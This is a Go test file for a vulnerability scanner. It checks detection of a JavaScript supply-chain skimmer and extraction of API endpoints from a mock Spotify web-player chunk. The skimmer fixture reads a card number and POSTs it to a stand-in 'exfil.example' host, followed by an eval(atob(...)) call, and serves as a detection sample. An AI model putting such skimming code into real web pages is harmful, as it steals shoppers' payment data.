package vulnscan

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestScanFileContent_AdvancedFileTypes(t *testing.T) {
	s, _ := NewScanner("http://localhost")

	// Test CSS file analysis
	cssContent := `body { background: url('https://evil-cdn.example/bg.jpg'); }`
	vulns := s.ScanFileContent("styles.css.загружено", cssContent, "file://styles.css")
	if vulns == nil {
		t.Error("expected non-nil slice")
	}

	// Test JS supply chain in .mjs
	jsContent := `
	const cardnumber = document.getElementById('card').value;
	fetch('https://exfil.example/log', {method: 'POST', body: cardnumber});
	eval(atob('c2VjcmV0'));
	`
	vulnsJS := s.ScanFileContent("app.mjs", jsContent, "file://app.mjs")
	foundMagecart := false
	for _, v := range vulnsJS {
		if strings.Contains(v.ID, "SUPPLY") || strings.Contains(v.Name, "Magecart") {
			foundMagecart = true
		}
	}
	if !foundMagecart {
		t.Error("expected Magecart / JS supply chain detection in .mjs file")
	}
}

func TestExtensionlessAndEndpointExtraction(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "spotify_dump_test")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	// Extensionless blob file mimicking Spotify web-player chunk containing JS and API endpoints
	blobContent := `
	function webpackChunk() {
		const apiUrl = "https://api.spotify.com/v1/playlists/37i9dQZF1DXcBWIGoYBM5M";
		const internalRoute = "/api/v2/user/profile";
	}
	`
	blobPath := filepath.Join(tmpDir, "ab6761610000101f80da10c3701e83a694b83005")
	if err := os.WriteFile(blobPath, []byte(blobContent), 0644); err != nil {
		t.Fatalf("failed to write blob file: %v", err)
	}

	s, _ := NewScanner("http://localhost")
	vulns, err := s.ScanHTMLDirectory(tmpDir)
	if err != nil {
		t.Fatalf("ScanHTMLDirectory failed: %v", err)
	}

	foundInventory := false
	for _, v := range vulns {
		if v.ID == "WS-INV-001" {
			foundInventory = true
			if !strings.Contains(v.Evidence, "api.spotify.com") || !strings.Contains(v.Evidence, "/api/v2/user/profile") {
				t.Errorf("expected extracted endpoints in inventory evidence, got: %s", v.Evidence)
			}
		}
	}
	if !foundInventory {
		t.Error("expected WS-INV-001 inventory finding from directory scan")
	}
}
